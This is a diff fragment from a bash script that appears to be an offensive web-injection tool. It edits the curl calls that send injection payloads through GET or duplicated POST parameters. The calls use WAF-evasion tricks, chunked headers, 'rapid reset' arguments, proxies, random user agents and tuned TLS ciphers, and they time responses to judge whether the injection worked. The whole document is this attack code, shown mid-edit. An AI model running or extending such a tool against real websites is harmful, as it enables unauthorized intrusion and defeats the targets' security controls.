@@ -239,21 +239,21 @@ dork() {
             output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
           fi
           echo -e "$output_text"
-          if [ "$REQ_METHOD" = "POST" ]; then
-
+                   if [ "$REQ_METHOD" = "POST" ]; then
             curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
-              curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
+              curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
               -m 12 -A "$random_ua" -s -o /dev/null -d @- \
               -w "%{time_total}|%{http_code}" \
               "${target_url}${default_path}")
           else
-            curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
+            curl_output=$(curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
               -m 12 -A "$random_ua" -s -o /dev/null \
               -w "%{time_total}|%{http_code}" \
               "${clean_target_url}${default_path}?${TARGET_PARAM}=${active_payload}")
-          fi
+          fi 
+              
                       local stopwatch
             local http_status
             stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
@@ -385,15 +385,14 @@ dork() {
           fi
           echo -e "$output_text"
           if [ "$REQ_METHOD" = "POST" ]; then
-
             curl_output=$(echo -n "${TARGET_PARAM}=999&${TARGET_PARAM}=${defiance_tamper_path}" | \
-              curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
+              curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
               -m 12 -A "$random_ua" -s -o /dev/null -d @- \
               -w "%{time_total}|%{http_code}" \
               "${target_url}${default_path}")
           else
-            curl_output=$(curl $proxy_flag $cookie_flag $waf_trick $rapid_reset_args $chunked_headers \
+            curl_output=$(curl $proxy_flag $cookie_flag "${waf_trick[@]}" $rapid_reset_args "${chunked_headers[@]}" \
               --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
               -m 12 -A "$random_ua" -s -o /dev/null \
               -w "%{time_total}|%{http_code}" \
